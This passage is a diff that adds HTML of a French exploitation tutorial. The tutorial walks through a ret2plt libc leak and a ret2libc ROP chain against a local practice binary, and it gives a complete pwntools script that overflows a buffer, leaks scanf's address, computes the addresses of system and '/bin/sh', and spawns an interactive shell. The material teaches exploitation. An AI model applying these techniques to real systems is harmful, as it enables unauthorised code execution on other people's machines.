+    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./testrop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Input:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;# pwntools permet de récupérer les adresses directement dans le binaire sans avoir à les chercher via objdump :&lt;/span&gt;
+&lt;span class="n"&gt;addrmain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# 0x8048477&lt;/span&gt;
+&lt;span class="n"&gt;pr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x080482f5&lt;/span&gt;  &lt;span class="c1"&gt;#: pop ebx ; ret&lt;/span&gt;
+&lt;span class="n"&gt;gotscanf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;got.__isoc99_scanf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# 0x804975c&lt;/span&gt;
+&lt;span class="n"&gt;pltputs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# 0x8048310 &lt;/span&gt;
+&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;76&lt;/span&gt;
+
+&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Construct ropchain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ropchain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pltputs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gotscanf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addrmain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# p32 permet de &amp;quot;pack&amp;quot; une adresse : 0x61616161 -&amp;gt; &amp;quot;aaaa&amp;quot; &lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Get scanf leak&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ropchain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Input:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le script retourne bien l'adresse de &lt;em&gt;scanf&lt;/em&gt; en little endian &lt;code&gt;@q▒▒&lt;/code&gt;et se relance tout seul :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@q&lt;/span&gt;&lt;span class="err"&gt;▒▒&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="k"&gt;Input&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Cette bouillie de caractères est en réalité l'adresse que nous venons de récupérer. &lt;/p&gt;
+&lt;p&gt;Elle ne nous apparaît bien évidemment pas de façon à ce que nous puissions la lire à l'œil nu, mais notre script va s'en charger pour nous :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Input:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;leak_scanf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Leak got scanf: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_scanf&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous avons donc un leak de la libc (et plus précisément de la fonction scanf()) !&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://dailysecurity.fr/images/rocknroll.gif" alt="Surprise" style="width: 50%;"/&gt;&lt;/p&gt;
+&lt;p&gt;Nous arrivons donc à notre dernière partie : faire un &lt;strong&gt;ret2libc&lt;/strong&gt; vers system().&lt;/p&gt;
+&lt;p&gt;Si vous ne savez pas ce qu'est un ret2libc, je vous redirige vers la section prérequis en haut de l'article.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;tl;dr : C'est globalement un ret2plt avec une fonction de la libc.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Actuellement, nous avons l'adresse de &lt;em&gt;scanf&lt;/em&gt; dans la libc mais pas celle de &lt;em&gt;system&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Heureusement, nous pouvons la calculer facilement car l'écart entre deux fonctions de la libc est toujours le même. &lt;/p&gt;
+&lt;p&gt;Ainsi scanfLibc -/+ offset = systemLibc.&lt;/p&gt;
+&lt;p&gt;La librairie pwntools permet de calculer l'offset de différence très facilement : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;leak_system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;leak_scanf&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;scanf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nous avons déjà notre gadget pop;ret; afin de mettre un argument sur la stack, ici "/bin/sh".&lt;/p&gt;
+&lt;p&gt;La chaîne "/bin/sh" est présente dans la libc ainsi que dans la variable SHELL de l'environnement du programme.&lt;/p&gt;
+&lt;p&gt;Calcul de l'adresse de "/bin/sh" avec pwntools :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;leak_binsh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;leak_scanf&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;scanf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;next&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La suite de notre ropchain sera donc :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;ropchain = systemLibc &lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="c"&gt; addrPopEbxRet &lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt;&lt;span class="c"&gt; addrBinsh&lt;/span&gt;
+
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;|        Adresse system       |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;| 0x080482f5 : pop ebx ; ret; |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="c"&gt;|       Adresse &amp;quot;/bin/sh&amp;quot;     |&lt;/span&gt;
+&lt;span class="c"&gt;|                             |&lt;/span&gt;
+&lt;span class="nb"&gt;+-----------------------------+&lt;/span&gt;&lt;span class="c"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On résume la méthode :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On leak une adresse de la libc grâce à un ret2plt de &lt;em&gt;puts&lt;/em&gt; (&lt;em&gt;printf&lt;/em&gt; ou &lt;em&gt;send&lt;/em&gt; marchent aussi)&lt;/li&gt;
+&lt;li&gt;On calcule l'adresse de &lt;em&gt;system&lt;/em&gt; et de /bin/sh  à partir de ce leak&lt;/li&gt;
+&lt;li&gt;On fait un ret2libc vers system() pour avoir un shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;On test notre script qui contient la ropchain complète :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
+
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+
+&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./testrop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;libc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/lib32/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;quot;info sharedlibrary&amp;quot; sous gdb pour connaître le chemin de votre libc&lt;/span&gt;
+
+&lt;span class="n"&gt;DEBUG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;until&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;until&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DEBUG&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./testrop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Input:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;# pwntools permet de récupérer les adresses directement dans le binaire sans avoir à les chercher via objdump :&lt;/span&gt;
+&lt;span class="n"&gt;addrmain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# 0x8048477&lt;/span&gt;
+&lt;span class="n"&gt;pr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x080482f5&lt;/span&gt;  &lt;span class="c1"&gt;#: pop ebx ; ret&lt;/span&gt;
+&lt;span class="n"&gt;gotscanf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;got.__isoc99_scanf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# 0x804975c&lt;/span&gt;
+&lt;span class="n"&gt;pltputs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# 0x8048310 &lt;/span&gt;
+&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;76&lt;/span&gt;
+
+&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Construct ropchain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ropchain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pltputs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gotscanf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addrmain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# p32 permet de &amp;quot;pack&amp;quot; une adresse : 0x61616161 -&amp;gt; &amp;quot;aaaa&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Get scanf leak&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ropchain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Input:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;leak_scanf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;span class="n"&gt;leak_system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;leak_scanf&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;__isoc99_scanf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;leak_binsh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;leak_scanf&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;__isoc99_scanf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;next&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Leak got scanf: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_scanf&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Leak system: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_system&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Leak /bin/sh: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_binsh&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+
+&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Get shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ropchain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;padding&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak_binsh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ropchain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Interactive shell&lt;/span&gt;
+&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Résultat : &lt;/p&gt;
